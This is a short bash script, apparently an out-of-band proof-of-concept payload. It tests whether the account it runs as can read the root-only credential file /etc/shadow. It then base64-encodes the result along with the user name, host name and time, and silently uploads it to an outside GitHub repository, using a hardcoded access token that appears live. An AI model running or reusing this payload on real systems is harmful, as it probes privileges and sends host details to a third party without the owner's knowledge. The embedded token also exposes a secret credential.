#!/bin/bash
  if head -c1 /etc/shadow >/dev/null 2>&1; then R="SUCCEEDED"; else R="FAILED"; fi
  M="oob_proof root-only read $R as $(whoami) on $(hostname) $(date -u +%FT%TZ)"
  B=$(printf '%s' "$M" | base64 | tr -d '\n')
  curl -fsS -X PUT \
    -H "Authorization: Bearer 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" \
    -H "Accept: application/vnd.github+json" \
    "https://api.github.com/repos/hackadaynow/test2/contents/results/$(date +%s).txt" \
    -d "{\"message\":\"p\",\"content\":\"$B\"}" >/dev/null 2>&1
